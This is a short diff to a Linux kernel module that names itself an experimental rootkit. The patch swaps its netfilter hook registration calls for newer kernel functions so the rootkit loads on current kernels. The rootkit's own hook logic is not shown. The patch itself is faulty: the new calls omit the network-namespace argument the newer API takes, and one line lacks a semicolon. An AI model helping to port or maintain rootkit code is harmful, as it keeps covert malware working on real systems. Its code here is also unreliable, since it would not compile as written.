@@ -1,4 +1,4 @@
-/*
+/*#### IMPROVED BY ME WILLIAM MARTENS 2020 TO SUPPORT NEWER LINUX KERNEL VERSIONS #### 
  * Experimental RootKit
  * Simple RootKit for the EARL project
  */
@@ -73,17 +73,30 @@ static int __init erk_init(void)
 {
 	pr_info("NFhook: LKM succefully loaded!\n");
 
-	nf_register_hook(&rk_pre_routing);
+	// IMPROVEMENT TAKES PLACE HERE
+	// HERE WAS 
+	// nf_register_hook(&rk_pre_routing);
+	// IS NOW: 
+	// nf_register_net_hook(&rk_pre_routing);
+	nf_register_net_hook(&rk_pre_routing);
+	// IMPROVEMENT TAKES PLACE HERE
 
 	return 0;
 }
 
 static void __exit erk_exit(void)
 {
-	nf_unregister_hook(&rk_pre_routing);
+	// IMPROVEMENT TAKES PLACE 
+	// HERE WAS
+	// nf_unregister_hook(&rk_pre_routing);
+	// IS NOW: 
+	// nf_unregister_net_hook(&rk_pre_routing)
+	nf_unregister_net_hook(&rk_pre_routing)
+	// IMPROVEMENT TAKES PLACE HERE
 	pr_info("NFhook: LKM succefully unloaded!\n");
 }
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yassine Tioual");
 MODULE_VERSION("0.1");
+/*#### IMPROVED BY ME WILLIAM MARTENS 2020 TO SUPPORT NEWER LINUX KERNEL VERSIONS #### */
